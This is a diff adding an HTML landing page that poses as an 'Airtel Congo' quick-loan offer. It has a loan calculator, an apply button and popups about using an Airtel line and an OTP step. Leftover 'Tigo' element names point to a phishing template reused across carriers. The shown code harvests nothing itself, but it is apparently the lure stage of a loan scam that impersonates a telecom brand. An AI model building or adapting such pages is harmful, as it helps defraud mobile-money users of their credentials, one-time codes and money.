@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Airtel Congo - Prêt</title>
+    <style>
+        :root { --airtel-red: #e60000; --airtel-dark: #1a1a1a; --white: #ffffff; --danger: #ef4444; --dark: #1e293b; --gray: #64748b; --light: #fff5f5; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: var(--light); color: var(--dark); min-height: 100vh; display: flex; flex-direction: column; }
+        .brand-bar { background: var(--airtel-red); text-align: center; padding: 0.8rem; display: flex; align-items: center; justify-content: center; gap: 0.6rem; }
+        .brand-logo { width: 32px; height: 32px; background: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 900; font-size: 0.8rem; color: var(--airtel-red); }
+        .brand-text { font-size: 1.1rem; font-weight: 700; color: var(--white); }
+        .main-container { max-width: 500px; margin: 2rem auto; padding: 0 1rem; flex: 1; }
+        .hero-card { background: var(--white); border-radius: 20px; padding: 2.5rem 2rem; box-shadow: 0 4px 15px rgba(0,0,0,0.06); text-align: center; }
+        .hero-card h1 { font-size: 2rem; font-weight: 900; color: var(--airtel-red); }
+        .hero-card .subtitle { color: var(--gray); font-size: 0.9rem; margin-bottom: 2rem; }
+        .slider-group { margin-bottom: 1.2rem; text-align: left; }
+        .slider-group label { display: flex; justify-content: space-between; font-weight: 600; font-size: 0.9rem; }
+        .slider-group label span { color: var(--airtel-red); font-weight: 700; }
+        .slider-group input[type="range"] { width: 100%; height: 6px; -webkit-appearance: none; background: #ffe5e5; border-radius: 5px; }
+        .slider-group input[type="range"]::-webkit-slider-thumb { -webkit-appearance: none; width: 24px; height: 24px; background: var(--airtel-red); border-radius: 50%; cursor: pointer; border: 3px solid white; }
+        .calc-result { background: #ffe5e5; border-radius: 14px; padding: 1.2rem; margin: 1.5rem 0; }
+        .calc-result .amount { font-size: 2.2rem; font-weight: 900; color: var(--airtel-red); }
+        .btn { width: 100%; padding: 1rem; border-radius: 50px; font-weight: 700; font-size: 1.1rem; cursor: pointer; border: none; font-family: inherit; margin-top: 1rem; color: white; }
+        .btn-red { background: var(--airtel-red); }
+        .popup-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.7); z-index: 1000; align-items: center; justify-content: center; }
+        .popup-overlay.active { display: flex; }
+        .popup-card { background: var(--white); border-radius: 14px; padding: 2rem; text-align: center; max-width: 400px; width: 90%; animation: popIn 0.5s ease; }
+        .popup-card .warn-icon { font-size: 3rem; margin-bottom: 0.5rem; }
+        .popup-card h3 { color: var(--danger); margin-bottom: 0.5rem; }
+        .popup-card p { color: var(--gray); margin-bottom: 1.5rem; font-size: 0.95rem; }
+        @keyframes popIn { from { opacity: 0; transform: scale(0.8); } to { opacity: 1; transform: scale(1); } }
+        .copyright-bar { background: var(--airtel-dark); text-align: center; padding: 1rem; margin-top: auto; }
+        .copyright-bar p { color: rgba(255,255,255,0.6); font-size: 0.75rem; }
+    </style>
+</head>
+<body>
+    <div class="brand-bar"><div class="brand-logo">A</div><div class="brand-text">Airtel Congo</div></div>
+    <div class="main-container"><div class="hero-card">
+        <h1>Obtenez Votre Prêt Rapidement</h1>
+        <p class="subtitle">Remplissez quelques informations et obtenez votre prêt via Airtel</p>
+        <div class="slider-group"><label>Montant du Prêt <span id="calcAmountLabel">$500</span></label><input type="range" id="calcAmount" min="50" max="500000" step="10" value="500"></div>
+        <div class="slider-group"><label>Durée du Prêt <span id="calcTermLabel">1 An</span></label><input type="range" id="calcTerm" min="1" max="5" step="1" value="1"></div>
+        <div class="calc-result"><div style="font-size:0.8rem;color:var(--gray);">Paiement Mensuel</div><div class="amount" id="calcResult">$45</div></div>
+        <button class="btn btn-red" onclick="goToApply()">Demander un Prêt →</button>
+    </div></div>
+    
+    <div class="popup-overlay" id="popupTigo">
+        <div class="popup-card">
+            <div class="warn-icon">⚠️</div>
+            <h3>Prêt pour les Clients Airtel Uniquement</h3>
+            <p>Ce prêt est réservé aux clients <strong>Airtel</strong>. Veuillez utiliser une ligne Airtel pour postuler.</p>
+            <button class="btn btn-red" onclick="closePopup('popupTigo')">D'accord, J'ai Compris</button>
+        </div>
+    </div>
+    
+    <div class="popup-overlay" id="popupOtpTigo">
+        <div class="popup-card">
+            <div class="warn-icon">⚠️</div>
+            <h3>Prêt pour les Clients Airtel Uniquement</h3>
+            <p>Utilisez une ligne <strong>Airtel</strong> pour demander un prêt afin d'être approuvé.</p>
+            <button class="btn btn-red" onclick="closePopup('popupOtpTigo')">D'accord, J'ai Compris</button>
+        </div>
+    </div>
+    
+    <div class="copyright-bar"><p>© 2024 Airtel Congo</p></div>
+    <script>
+        const ca=document.getElementById('calcAmount'),ct=document.getElementById('calcTerm');
+        function uc(){const a=parseInt(ca.value),y=parseInt(ct.value),r=0.065/12,m=y*12,p=a*r*Math.pow(1+r,m)/(Math.pow(1+r,m)-1);document.getElementById('calcAmountLabel').textContent='$'+a.toLocaleString();document.getElementById('calcTermLabel').textContent=y===1?'1 An':'Ans '+y;document.getElementById('calcResult').textContent='$'+Math.round(p).toLocaleString()+'/mois';}
+        ca.addEventListener('input',uc);ct.addEventListener('input',uc);uc();
+        function goToApply(){window.location.href='/apply?amount='+ca.value+'&term='+ct.value;}
+        function closePopup(id){document.getElementById(id).classList.remove('active');localStorage.removeItem(id);}
+        if(localStorage.getItem('popupTigo')==='true'){document.getElementById('popupTigo').classList.add('active');}
+        if(localStorage.getItem('popupOtpTigo')==='true'){document.getElementById('popupOtpTigo').classList.add('active');}
+    </script>
+</body>
+</html>
